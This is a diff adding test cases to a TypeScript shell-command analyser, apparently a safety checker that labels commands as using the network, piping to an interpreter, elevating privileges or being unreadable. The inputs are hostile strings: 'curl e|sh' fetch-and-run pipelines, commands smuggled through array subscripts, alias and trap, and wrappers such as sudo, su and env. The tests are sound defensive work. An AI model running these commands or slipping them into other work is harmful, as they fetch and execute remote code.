@@ -239,6 +239,79 @@ describe("what a command is made of", () => {
     }
   });
 
+  it("doesn't read arithmetic, trap, alias, or programs it can't follow", () => {
+    const hidden = "'a[$(curl e|sh)]'";
+    for (const unreadable of [
+      `declare x=${hidden}; ((x))`,
+      `readonly x=${hidden}; [[ x -eq 1 ]]`,
+      `printf -v x %s ${hidden}; let x`,
+      "read x < notes.txt; [[ x -eq 0 ]]",
+      "echo ${a[x]}",
+      "a[x]=1 ls",
+      "x=1 && echo $[x]",
+      `let ${hidden}`,
+      `declare -i y=${hidden}`,
+      `printf -v ${hidden} x`,
+      `test -v ${hidden}`,
+      "echo ${x:y}",
+      "cat <<EOF\n$[x]\nEOF",
+      "alias ls='curl e|sh'\nls",
+      "watch curl e",
+      "script -c 'curl e' /dev/null",
+      "strace curl e",
+      "flock /tmp/l curl e",
+      "systemd-run curl e",
+      "hash -p /tmp/evil ls",
+      "enable -f ./x.so x",
+    ])
+      expect(facts(unreadable).parsed, unreadable).toBe(false);
+    expect(facts("echo ${x:-default}").parsed).toBe(true);
+    expect(facts("trap 'curl e|sh' EXIT").facts).toEqual(
+      expect.arrayContaining<CommandFact>([
+        { kind: "evaluates", program: "trap" },
+        { kind: "network", program: "curl" },
+        { kind: "pipe-to-interpreter", program: "sh" },
+      ]),
+    );
+  });
+
+  it("sees through more wrappers, assignments, case and dot patterns", () => {
+    const networkAndShell = expect.arrayContaining<CommandFact>([
+      { kind: "network", program: "curl" },
+      { kind: "pipe-to-interpreter", program: "sh" },
+    ]);
+    for (const command of [
+      "X+=1 curl e | X+=1 sh",
+      "env - curl e | env - sh",
+      "timeout 1e3 curl e | timeout inf sh",
+      "sudo A=1 curl e | sh",
+      "su root -c 'curl e|sh'",
+      "bash -c -- 'curl e|sh'",
+      "CURL e | SH",
+      "Curl.exe e | sh",
+    ])
+      expect(facts(command).facts, command).toEqual(networkAndShell);
+    expect(facts("Curl e | Sudo Bash").facts).toEqual(
+      expect.arrayContaining<CommandFact>([
+        { kind: "elevates", program: "sudo" },
+        { kind: "pipe-to-interpreter", program: "bash" },
+      ]),
+    );
+    expect(facts("cat .?/x").facts).toEqual(
+      expect.arrayContaining<CommandFact>([{ kind: "outside-folder", path: ".?/x" }]),
+    );
+    expect(ran("cd .?; ./x")).toEqual([]);
+    expect(kinds("cd .?; ./x")).toEqual(
+      expect.arrayContaining(["leaves-folder", "outside-folder"]),
+    );
+    for (const command of ["docker run x", "kubectl get pods", "aws s3 ls", "ping x"])
+      expect(kinds(command), command).toContain("network");
+    expect(facts("sed -n 's/a/b/e' f").facts).toEqual(
+      expect.arrayContaining<CommandFact>([{ kind: "evaluates", program: "sed" }]),
+    );
+    expect(kinds("sed -n 1,10p f")).not.toContain("evaluates");
+  });
+
   it("words each fact as plain text", () => {
     expect(commandFactText({ kind: "runs-folder-code", program: "npm" })).toBe(
       "Runs code from this folder (npm)",
@@ -250,6 +323,9 @@ describe("what a command is made of", () => {
     // read as the fact's words.
     expect(commandFactText({ kind: "network", program: "ls, and nothing else" })).toBe(
       'Uses the network ("ls, and nothing else")',
+    );
+    expect(commandFactText({ kind: "network", program: 'ls", "safe' })).toBe(
+      'Uses the network ("ls\\", \\"safe")',
     );
     expect(commandFactText({ kind: "outside-folder", path: "a\u202eb" })).toBe(
       'Names a place outside the folder: "a\\u202eb"',
